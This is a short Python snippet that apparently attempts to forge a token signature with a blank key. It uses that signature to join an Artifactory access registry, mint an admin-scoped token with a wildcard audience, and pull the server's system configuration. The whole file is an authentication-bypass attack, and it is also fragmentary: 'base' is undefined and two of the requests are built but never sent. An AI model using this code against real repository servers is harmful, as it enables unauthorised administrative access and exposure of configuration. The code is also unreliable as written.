import base64, hashlib, hmac, json, urllib.request
kid = hashlib.sha256(b"").hexdigest()
header = {"alg": "HS256", "kid": kid}
body = base64.urlsafe_b64encode(json.dumps(header).encode())
signature = hmac.new(b" " * 32, body, hashlib.sha256).digest()
join = urllib.request.Request(base + "/access/api/v1/registry/join", data=signature, method="POST")
payload = json.dumps({"scope": "applied-permissions/admin", "audience": "*"}).encode()
mint = urllib.request.Request(base + "/access/api/v1/tokens", data=payload, method="POST")
config = urllib.request.urlopen(base + "/artifactory/api/system/configuration")
